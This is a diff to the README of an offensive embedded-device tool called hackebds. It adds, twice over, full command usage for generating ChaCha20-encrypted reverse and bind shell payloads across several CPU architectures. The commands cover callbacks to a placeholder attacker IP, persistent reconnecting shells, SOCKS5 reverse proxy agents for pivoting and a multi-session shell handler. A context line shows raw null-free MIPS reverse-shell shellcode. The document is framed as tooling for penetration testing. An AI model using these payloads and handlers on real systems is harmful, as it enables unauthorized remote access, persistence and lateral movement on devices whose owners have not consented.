@@ -9,7 +9,7 @@
 
 ## foreword
 
->In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell，bind_shell，socks5 is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**
+>In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**
 
 ## fuction
 
@@ -42,6 +42,116 @@ This tool is embedded in the security test of the device. There are two main fun
     10.4 **Multi-session shell management** — a built-in console with tab completion and command history to manage multiple concurrent sessions from a single operator terminal.
 
     10.5 **Unified server mode** that combines the SOCKS5 proxy server and the multi-session shell manager into a single console, so one process can handle both pivoting and shell sessions at the same time.
+
+    #### 0.4.1 command usage
+
+    Encrypted reverse shell — handler (attacker):
+
+    ```
+    hackebds -server encrypted_shell_reverse -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key"
+    ```
+
+    Encrypted reverse shell — generate payload (aarch64 / x64 / armelv7):
+
+    ```
+    hackebds -arch aarch64 -res reverse_shell_file \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+    hackebds -arch x64 -res reverse_shell_file \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+    hackebds -arch armelv7 -res reverse_shell_file \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+    ```
+
+    Full PTY mode (payload + handler):
+
+    ```
+    hackebds -arch aarch64 -res reverse_shell_file --pty \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key" \
+             -shell /bin/bash -filename eshell
+
+    hackebds -server encrypted_shell_reverse --pty \
+             -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key"
+    ```
+
+    Encrypted bind shell — generate and connect:
+
+    ```
+    hackebds -arch aarch64 -res bind_shell \
+             -bind_port 5555 -passwd "s3cret" \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename ebind
+
+    hackebds -server encrypted_shell_bind \
+             -reverse_ip <target_ip> -reverse_port 5555 \
+             -cipher chacha20 -encrypt_key "my_secret_key"
+    ```
+
+    Persistent encrypted reverse shell (reconnect every 10s):
+
+    ```
+    hackebds -arch aarch64 -res reverse_shell_file --power -sleep 10 \
+             -reverse_ip <attacker_ip> -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_secret_key" -filename epshell
+    ```
+
+    Encrypted SOCKS5 reverse proxy — server, agent, and with auth:
+
+    ```
+    hackebds -res reverse_proxy_server -arch aarch64 \
+             -agent_port 8888 -socks_port 1080 \
+             -cipher chacha20 -encrypt_key "tunnel_key" -filename server
+
+    hackebds -arch mipsel -res reverse_proxy_file \
+             -reverse_ip <server_ip> -reverse_port 8888 \
+             -cipher chacha20 -encrypt_key "tunnel_key" -filename agent
+
+    hackebds -res reverse_proxy_server -arch x64 \
+             -agent_port 8888 -socks_port 1080 \
+             -socks_auth admin:secretpass \
+             -cipher chacha20 -encrypt_key "key" -filename server
+    ```
+
+    Python SOCKS5 reverse server mode:
+
+    ```
+    hackebds -server socks5_reverse \
+             -agent_port 8888 -socks_port 1080 \
+             -socks_auth admin:pass \
+             -cipher chacha20 -encrypt_key "key"
+    ```
+
+    Multi-session shell manager and unified proxy+shell server:
+
+    ```
+    hackebds -server encrypted_shell_manager \
+             -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key"
+
+    hackebds -server unified \
+             -agent_port 8888 -socks_port 1080 \
+             -reverse_port 4444 \
+             -cipher chacha20 -encrypt_key "my_key"
+    ```
+
+    Manager console commands:
+
+    ```
+    hackebds> list                    # List active sessions
+    hackebds> interact <id>           # Enter interactive shell
+    hackebds> kill <id>               # Kill session
+    hackebds> maxconn <n>             # Set max sessions per IP
+    hackebds> status                  # Show server status
+    hackebds> notify [on|off]         # Toggle notifications
+    hackebds> pool                    # Show proxy agent pool
+    hackebds> exit                    # Stop and exit
+    ```
 
 ## install
 
@@ -335,6 +445,118 @@ example:
 >>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
 [+] No NULL byte shellcode for hex(len is 264):
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
+```
+
+### 0.4.1 encrypted shell & SOCKS5 proxy usage
+
+The 0.4.1 release adds ChaCha20 encrypted reverse/bind shells, pure-assembly SOCKS5 proxy ELFs, a full-PTY interactive mode, a multi-session shell manager and a unified proxy+shell server. All new CLI usage is listed below.
+
+1) Encrypted reverse shell — handler on the attacker side:
+
+```
+hackebds -server encrypted_shell_reverse -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key"
+```
+
+2) Encrypted reverse shell — generate target payload (aarch64 / x64 / armelv7):
+
+```
+hackebds -arch aarch64 -res reverse_shell_file \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+hackebds -arch x64 -res reverse_shell_file \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+
+hackebds -arch armelv7 -res reverse_shell_file \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+```
+
+3) Full PTY interactive mode (payload + handler):
+
+```
+hackebds -arch aarch64 -res reverse_shell_file --pty \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key" \
+         -shell /bin/bash -filename eshell
+
+hackebds -server encrypted_shell_reverse --pty \
+         -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key"
+```
+
+4) Encrypted bind shell — generate and connect:
+
+```
+hackebds -arch aarch64 -res bind_shell \
+         -bind_port 5555 -passwd "s3cret" \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename ebind
+
+hackebds -server encrypted_shell_bind \
+         -reverse_ip <target_ip> -reverse_port 5555 \
+         -cipher chacha20 -encrypt_key "my_secret_key"
+```
+
+5) Persistent encrypted reverse shell (reconnect every 10s):
+
+```
+hackebds -arch aarch64 -res reverse_shell_file --power -sleep 10 \
+         -reverse_ip <attacker_ip> -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_secret_key" -filename epshell
+```
+
+6) Encrypted SOCKS5 reverse proxy — server, agent, and with RFC 1929 auth:
+
+```
+hackebds -res reverse_proxy_server -arch aarch64 \
+         -agent_port 8888 -socks_port 1080 \
+         -cipher chacha20 -encrypt_key "tunnel_key" -filename server
+
+hackebds -arch mipsel -res reverse_proxy_file \
+         -reverse_ip <server_ip> -reverse_port 8888 \
+         -cipher chacha20 -encrypt_key "tunnel_key" -filename agent
+
+hackebds -res reverse_proxy_server -arch x64 \
+         -agent_port 8888 -socks_port 1080 \
+         -socks_auth admin:secretpass \
+         -cipher chacha20 -encrypt_key "key" -filename server
+```
+
+7) Python SOCKS5 reverse server mode:
+
+```
+hackebds -server socks5_reverse \
+         -agent_port 8888 -socks_port 1080 \
+         -socks_auth admin:pass \
+         -cipher chacha20 -encrypt_key "key"
+```
+
+8) Multi-session shell manager and unified proxy+shell server:
+
+```
+hackebds -server encrypted_shell_manager \
+         -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key"
+
+hackebds -server unified \
+         -agent_port 8888 -socks_port 1080 \
+         -reverse_port 4444 \
+         -cipher chacha20 -encrypt_key "my_key"
+```
+
+9) Manager console commands:
+
+```
+hackebds> list                    # List active sessions
+hackebds> interact <id>           # Enter interactive shell
+hackebds> kill <id>               # Kill session
+hackebds> maxconn <n>             # Set max sessions per IP
+hackebds> status                  # Show server status
+hackebds> notify [on|off]         # Toggle notifications
+hackebds> pool                    # Show proxy agent pool
+hackebds> exit                    # Stop and exit
 ```
 
 ## chips and architectures
